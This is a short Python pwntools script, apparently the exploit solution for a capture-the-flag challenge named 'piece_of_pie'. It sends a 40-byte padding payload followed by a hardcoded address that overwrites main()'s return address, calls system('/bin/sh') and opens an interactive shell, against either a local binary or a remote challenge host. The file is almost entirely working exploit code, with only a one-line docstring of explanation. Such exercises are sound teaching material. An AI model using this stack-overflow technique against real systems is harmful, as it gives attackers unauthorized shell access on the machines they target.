#!/usr/bin/env python

"""
Solution (exploit) for piece_of_pie challenge.

Use pwntools (https://docs.pwntools.com/en/latest/) to overwrite the return
address of main() and call system("/bin/sh").
"""

from pwn import *

local = True
if local:
    io = process("../archive/piece_of_pie/piece_of_pie")
else:
    HOST = "141.85.224.101"
    PORT = 13370
    io = remote(HOST, PORT)

offset = 40
system_bin_sh_address = 0x0000000000400646

payload = 40 * 'A' + p64(system_bin_sh_address)

msg = io.recvuntil(': ')
io.sendline(payload)

io.interactive()
